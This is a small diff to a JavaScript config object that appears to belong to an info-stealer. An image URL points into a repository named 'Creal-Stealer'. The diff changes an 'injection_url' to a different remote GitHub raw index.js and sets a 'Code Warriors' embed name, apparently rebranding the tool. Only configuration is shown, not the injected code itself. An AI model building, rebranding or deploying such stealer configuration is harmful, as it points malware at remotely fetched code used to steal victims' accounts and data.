@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Code Warriors', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Robmo0007/CodeWarriors1/main/index.js', 
   /**
    
    **/
